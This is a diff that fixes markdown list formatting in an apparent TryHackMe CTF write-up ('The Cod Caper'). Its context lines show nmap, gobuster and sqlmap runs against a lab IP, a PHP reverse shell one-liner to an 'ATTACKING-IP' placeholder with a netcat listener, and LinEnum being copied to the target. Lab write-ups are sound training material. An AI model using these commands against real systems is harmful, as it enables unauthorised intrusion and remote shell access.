@@ -22,9 +22,9 @@
 
 **Task 2 Host Enumeration)**
 
--Recommended Tool - nmap:
+- Recommended Tool - nmap:
 
--**Nmap**
+- **Nmap**
      
     -kali@kali:~$ nmap -vv -sC -sV 10.10.85.135 
      Scanning 10.10.85.135 [1000 ports]
@@ -73,7 +73,7 @@
    
 **Task 3 (Web Enumeration)**
     
- -**Gobuster:**
+ - **Gobuster:**
          
          kali@kali:~/Documents$ gobuster dir -u http://10.10.85.135 -w big.txt -x php,txt,html
          ===============================================================
@@ -111,7 +111,7 @@
      
 **Task 4 (Web Exploitation)**
 
--**sqlmap**
+- **sqlmap**
        
        kali@kali:~$ sqlmap -v -u 
        http://10.10.85.135/administrator.php  --data 'username=&password=' -users -T --dump
@@ -180,16 +180,16 @@
      
 **Task 5 (Command Execution)**
 
--**PHP reverse shell & netcat** 
+- **PHP reverse shell & netcat** 
  
 ![alt text](https://github.com/kashyap-source/Try-Hack-Me/blob/master/Linux/The%20Cod%20Caper/Image/Screenshot%202020-11-09%2013_30_06.png)
 
--A useful PHP reverse shell:
+- A useful PHP reverse shell:
        
         php -r '$sock=fsockopen("ATTACKING-IP",80);exec("/bin/sh -i <&3 >&3 2>&3");'
         (Assumes TCP uses file descriptor 3. If it doesn't work, try 4,5, or 6)
  
--Netcat   
+- Netcat   
         
             kali@kali:~$ sudo nc -lnvp 80
             Listening on 0.0.0.0 80
@@ -265,7 +265,7 @@
                 
 **Task 6 (LinEnum)**  
 
--**LinEnum**
+- **LinEnum**
      
             kali@kali:~/Downloads$ scp LinEnum.sh pingu@10.10.210.94:/tmp
             pingu@10.10.210.94's password: 
